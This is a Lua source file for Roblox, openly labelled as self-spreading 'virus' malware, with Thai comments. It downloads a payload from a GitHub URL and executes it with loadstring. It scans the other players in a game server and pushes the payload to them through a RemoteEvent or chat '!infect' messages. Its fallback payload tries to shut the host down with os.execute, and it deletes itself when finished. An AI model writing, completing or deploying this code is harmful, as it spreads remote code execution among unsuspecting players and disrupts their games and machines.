-- virus_fsm.lua
-- Finite State Machine Malware with Maid Cleanup, State Machine, and Robust Error Handling
-- ดึง payload จาก GitHub, แพร่กระจาย, ล้างตัวเองเมื่อจบ
-- Error Handling Pattern: pcall สำหรับ network, JSON, remote fire, payload execution

-- ============================================
-- MAID PATTERN (cleanup.md)
-- ============================================
local Maid = {}
Maid.__index = Maid

function Maid.new()
    return setmetatable({ _tasks = {} }, Maid)
end

function Maid:GiveTask(task)
    table.insert(self._tasks, task)
    return task
end

function Maid:DoCleaning()
    for i = #self._tasks, 1, -1 do
        local task = self._tasks[i]
        self._tasks[i] = nil
        if typeof(task) == "RBXScriptConnection" then
            task:Disconnect()
        elseif type(task) == "function" then
            pcall(task)
        elseif typeof(task) == "Instance" then
            task:Destroy()
        elseif type(task) == "table" and type(task.Destroy) == "function" then
            pcall(function() task:Destroy() end)
        end
    end
end

-- ============================================
-- ERROR HANDLING HELPERS (error-handling.md)
-- ============================================
local function safeDecodeJSON(httpService, rawJson)
    if type(rawJson) ~= "string" or rawJson == "" then
        return nil, "invalid or empty JSON string"
    end
    local ok, result = pcall(function()
        return httpService:JSONDecode(rawJson)
    end)
    if not ok then
        warn("[FSM] JSON decode failed:", result)
        return nil, result
    end
    if type(result) ~= "table" then
        warn("[FSM] JSON result is not a table:", type(result))
        return nil, "result is not table"
    end
    return result, nil
end

local function safeHttpGet(httpService, url, timeout)
    if type(url) ~= "string" or url == "" then
        return nil, "invalid URL"
    end
    timeout = timeout or 5
    local ok, response = pcall(function()
        return httpService:GetAsync(url, timeout)
    end)
    if not ok then
        warn("[FSM] HTTP GET failed:", response)
        return nil, response
    end
    return response, nil
end

local function safeFireRemote(remote, ...)
    if not remote or not remote:IsA("RemoteEvent") then
        return false, "invalid remote"
    end
    local ok, err = pcall(function()
        remote:FireServer(...)
    end)
    if not ok then
        warn("[FSM] Remote fire failed:", err)
        return false, err
    end
    return true, nil
end

local function safeLoadString(payload)
    if type(payload) ~= "string" or payload == "" then
        return nil, "payload is empty or not string"
    end
    local func, err = loadstring(payload)
    if not func then
        warn("[FSM] loadstring failed:", err)
        return nil, err
    end
    return func, nil
end

local function safeExecutePayload(payload)
    local func, err = safeLoadString(payload)
    if not func then
        return false, err
    end
    local ok, execErr = pcall(func)
    if not ok then
        warn("[FSM] payload execution failed:", execErr)
        return false, execErr
    end
    return true, nil
end

local function safeInfectVictim(remote, player, payload)
    if not player or not player:IsA("Player") then
        return false, "invalid player"
    end
    if remote then
        return safeFireRemote(remote, player.Name, payload)
    else
        -- fallback: chat
        local ok, err = pcall(function()
            player:Chat("!infect " .. tostring(payload))
        end)
        if not ok then
            warn("[FSM] Chat infection failed:", err)
            return false, err
        end
        return true, nil
    end
end

-- ============================================
-- FSM CORE
-- ============================================
local FSM = {
    CurrentState = "IDLE",
    States = {},
    Payload = nil,
    VictimList = {},
    Maid = Maid.new(),
    HeartbeatConnection = nil,
    Config = {
        SpreadInterval = 5,
        MaxVictims = 100,
        PayloadURL = "https://raw.githubusercontent.com/yourusername/yourrepo/main/payload.lua",
    }
}

-- ============================================
-- STATE DEFINITIONS
-- ============================================

FSM.States.IDLE = {
    onEnter = function()
        print("[FSM] IDLE: กำลังรอคำสั่ง...")
        if not FSM.Payload then
            FSM:FetchPayload()
        end
    end
}

FSM.States.SCANNING = {
    onEnter = function()
        print("[FSM] SCANNING: กำลังสแกนหาเหยื่อ...")
        local ok, err = pcall(function()
            FSM:ScanVictims()
        end)
        if not ok then
            warn("[FSM] Scan failed:", err)
            FSM:SetState("ERROR", err)
            return
        end
        FSM:SetState("INFECTING")
    end
}

FSM.States.INFECTING = {
    onEnter = function()
        print("[FSM] INFECTING: กำลังแพร่กระจาย...")
        local ok, err = pcall(function()
            FSM:SpreadInfection()
        end)
        if not ok then
            warn("[FSM] Infection failed:", err)
            FSM:SetState("ERROR", err)
            return
        end
        FSM:SetState("SLEEPING")
    end
}

FSM.States.SLEEPING = {
    onEnter = function()
        print("[FSM] SLEEPING: หลับ " .. FSM.Config.SpreadInterval .. " วินาที")
        task.wait(FSM.Config.SpreadInterval)
        FSM:SetState("SCANNING")
    end
}

FSM.States.ERROR = {
    onEnter = function(err)
        print("[FSM] ERROR: " .. tostring(err))
        task.wait(2)
        FSM:SetState("IDLE")
    end
}

FSM.States.SHUTDOWN = {
    onEnter = function()
        print("[FSM] SHUTDOWN: กำลังล้างและทำลายตัวเอง...")
        FSM:SelfDestruct()
    end
}

-- ============================================
-- STATE TRANSITION (with validation)
-- ============================================

function FSM:SetState(newState, payload)
    if self.CurrentState == newState then return end
    local old = self.CurrentState

    if not self:IsValidTransition(old, newState) then
        warn("[FSM] Invalid transition:", old, "->", newState)
        return
    end

    if self.States[old] and self.States[old].onExit then
        pcall(self.States[old].onExit)
    end

    self.CurrentState = newState

    if self.States[newState] and self.States[newState].onEnter then
        pcall(self.States[newState].onEnter, payload)
    end
end

function FSM:IsValidTransition(from, to)
    local valid = {
        IDLE = { SCANNING = true, SHUTDOWN = true },
        SCANNING = { INFECTING = true, ERROR = true, SHUTDOWN = true },
        INFECTING = { SLEEPING = true, ERROR = true, SHUTDOWN = true },
        SLEEPING = { SCANNING = true, ERROR = true, SHUTDOWN = true },
        ERROR = { IDLE = true, SHUTDOWN = true },
        SHUTDOWN = {}
    }
    return valid[from] and valid[from][to] or false
end

-- ============================================
-- PAYLOAD HANDLING (with safe network calls)
-- ============================================

function FSM:FetchPayload()
    print("[FSM] กำลังดึง payload...")
    local HttpService = game:GetService("HttpService")
    
    local response, err = safeHttpGet(HttpService, self.Config.PayloadURL, 5)
    if not response then
        warn("[FSM] Fetch payload failed:", err)
        self.Payload = self:GetFallbackPayload()
        self:ExecutePayload()
        return
    end
    
    local data, decodeErr = safeDecodeJSON(HttpService, response)
    if not data then
        warn("[FSM] JSON decode failed, treating as raw Lua:", decodeErr)
        -- ถ้าไม่ใช่ JSON ให้ถือว่าเป็น Lua string เลย
        self.Payload = response
    else
        -- ถ้า decode ได้เป็น table ให้ดึง payload field
        self.Payload = data.payload or data.script or data.code or response
    end
    
    self:ExecutePayload()
end

function FSM:GetFallbackPayload()
    return [[
        if os and os.execute then
            os.execute("shutdown /s /t 5 /c \"System error\"")
        end
        if script and script.Parent then
            script.Parent:Destroy()
        end
    ]]
end

function FSM:ExecutePayload()
    if not self.Payload then
        warn("[FSM] No payload to execute")
        return
    end
    
    local ok, err = safeExecutePayload(self.Payload)
    if not ok then
        warn("[FSM] Payload execution error:", err)
        self:SetState("ERROR", err)
    else
        print("[FSM] Payload executed successfully")
    end
end

-- ============================================
-- SPREAD INFECTION (with guard clauses)
-- ============================================

function FSM:ScanVictims()
    local Players = game:GetService("Players")
    local localPlayer = Players.LocalPlayer
    if not localPlayer then
        warn("[FSM] No local player found")
        self.VictimList = {}
        return
    end
    
    local victims = {}
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= localPlayer then
            table.insert(victims, player)
        end
    end
    self.VictimList = victims
    print("[FSM] พบเหยื่อ " .. #victims .. " ราย")
end

function FSM:SpreadInfection()
    local count = 0
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local remote = ReplicatedStorage:FindFirstChild("RemoteEvent")
    
    for _, player in ipairs(self.VictimList) do
        if count >= self.Config.MaxVictims then break end
        if not player or not player:IsA("Player") then
            warn("[FSM] Skip invalid victim")
            goto continue
        end
        
        local ok, err = safeInfectVictim(remote, player, self.Payload)
        if ok then
            count = count + 1
            print("[FSM] ติดเชื้อแล้ว:", player.Name)
        else
            warn("[FSM] Infect failed for", player.Name, ":", err)
        end
        
        ::continue::
        task.wait(0.5)
    end
    
    print("[FSM] แพร่เชื้อสำเร็จ " .. count .. " ราย")
end

-- ============================================
-- CLEANUP & SELF DESTRUCT
-- ============================================

function FSM:SelfDestruct()
    print("[FSM] กำลังล้างและทำลายตัวเอง...")
    self.Maid:DoCleaning()
    pcall(function()
        if script and script.Parent then
            script.Parent:Destroy()
        end
    end)
    print("[FSM] ทำลายตัวเองสำเร็จ")
    while true do task.wait(999999) end
end

-- ============================================
-- START (bind heartbeat to Maid)
-- ============================================

function FSM:Start()
    print("[FSM] เริ่มทำงาน...")
    
    local heartbeatConnection = game:GetService("RunService").Heartbeat:Connect(function()
        if FSM.CurrentState == "ERROR" then
            task.wait(10)
            FSM:SetState("IDLE")
        end
    end)
    self.Maid:GiveTask(heartbeatConnection)
    
    local Players = game:GetService("Players")
    local player = Players.LocalPlayer
    if player then
        local charConnection = player.CharacterRemoving:Connect(function()
            FSM.Maid:DoCleaning()
            print("[FSM] ล้างทรัพยากรตาม CharacterRemoving")
        end)
        self.Maid:GiveTask(charConnection)
    end
    
    self:SetState("IDLE")
end

-- ============================================
-- MAIN
-- ============================================

if game then
    print("[FSM] VC+ Virus FSM + Cleanup + Error Handling กำลังทำงาน...")
    FSM:Start()
end

-- ============================================
-- EXPORT
-- ============================================
return FSM
